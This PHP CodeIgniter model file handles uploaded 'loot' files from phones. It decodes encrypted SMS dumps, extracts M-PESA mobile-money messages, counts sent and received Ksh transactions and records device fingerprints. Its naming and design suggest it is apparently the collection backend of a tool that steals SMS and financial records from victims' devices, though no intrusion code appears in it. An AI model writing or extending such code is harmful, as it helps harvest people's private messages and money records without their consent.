<?php

namespace App\Models;

use CodeIgniter\API\ResponseTrait;

use CodeIgniter\Model;

use App\Models\ModCryption;

class ModUploads extends Model
{
    use ResponseTrait;
    protected $table = "tbl_Loot";

    public function file_upload($data){
        return $this->db->table('tbl_Loot')->insert($data);
    }

    public function loot_last_uploaded(){
        $result = $this->db->table('tbl_Loot')->selectMax('loot_Id')->get();
        //return $result->getResult()[0]->loot_Id;
        return $result->getResult()[0]->loot_Uuid;
    }

    public function loot_info($loot_uuid){
        $builder = $this->db->table('tbl_Loot');
        $result = $builder->select('loot_Name, loot_Device, loot_Owner, loot_Uuid')
            ->where('loot_Uuid', $loot_uuid)
            ->get();
        return $result->getResult();
    }

    public function loot_summary($loot_uuid){
        $builder = $this->db->table('tbl_Loot_Summary');
        $result = $builder->where('loot_Uuid', $loot_uuid)->get();
        return $result->getResult();
    }

    public function loot_parse_sms($loot_uuid, $loot_owner, $loot_device, $dated){
        $mod_cryption = new ModCryption();
        $query_name = $this->db->table('tbl_Loot')->select('loot_Name')
            //->where('loot_Id', $loot_id)->get()->getResult();
            ->where('loot_Uuid', $loot_uuid)->get()->getResult();
        $loot_name = $query_name[0]->loot_Name;
        $loot_file = WRITEPATH."uploads/txt_loot/".$loot_name;

        $loot_data = file_get_contents($loot_file);
        $loot_decoded = $mod_cryption->decode_content($loot_data);
        //echo gettype($loot_decoded);

        $data_dump1 = str_replace("-------(//)--------", "", $loot_decoded);
        $data_dump2 = str_replace("\n", '****', $data_dump1);
        $data_dump3 = str_replace('****"', '"', $data_dump2);
        $data_dump4 = "[".substr($data_dump3, 0, -2)."}]";

        $data = json_encode($data_dump4);
        $data1 = json_decode($data);
        $data2 = json_decode($data1);

        $receive = "Confirmed.You have received Ksh";
        $sent = " Confirmed. Ksh";
        $count_sent = 0; $count_receive = 0; $count_other = 0;

        foreach ($data2 as $smsdata) {
            if($smsdata->Number == "MPESA"){
                $sms_clean = base64_decode($smsdata->Body);

                if (stripos($sms_clean, $receive)){
                    $count_receive+=1;
                }else if (stripos($sms_clean, $sent)){
                    $count_sent+=1;
                }else{
                    $count_other+=1;
                }

                $thread_id = 'Thread Id';
                $data = array(
                    'sms_type' => $smsdata->Type,
                    'sms_number' => $smsdata->Number,
                    'sms_thread_id' => $smsdata->$thread_id,
                    'sms_time' => $smsdata->Date,
                    'sms_seen' => $smsdata->Seen,
                    'sms__id' => $smsdata->ID,
                    'sms_body' => $smsdata->Body,
                    'sms_loot_source' => $loot_uuid,
                    'sms_owner' => $loot_owner,
                    'sms_device' => $loot_device,
                );
                $this->db ->table('tbl_Sms')->insert($data);
            }
        }

        $data1 = array(
            'Loot_Uuid' => $loot_uuid,
            'info_Received' => $count_receive,
            'info_Sent' => $count_sent,
            'info_Unknown' => $count_other,
            'info_All' => $count_receive + $count_sent + $count_other,
            'loot_Created' => $dated
        );
        $this->db ->table('tbl_Loot_Summary')->insert($data1);

    }

    public function file_listing($loot_owner, $loot_device){
        $builder = $this->db->table('tbl_Loot');
        $get_all = $builder
            ->where('loot_Device', $loot_device)
            ->where('loot_Owner', $loot_owner)
            ->orderBy('loot_Id', 'DESC')
            ->get();
        return $get_all->getResult();
    }

    public function file_delete($userid){
        $table = 'tbl_users';
    }

    public function device_check_print($print_dump){
        $builder = $this->db->table('tbl_Devices');
        $get_all = $builder->select('device_Uuid')
                ->where($print_dump)
                ->get();
        return $get_all->getResult();
    }
    
    public function device_make_print($print_dump){
        return $this->db->table('tbl_Devices')->insert($print_dump);
    }
}
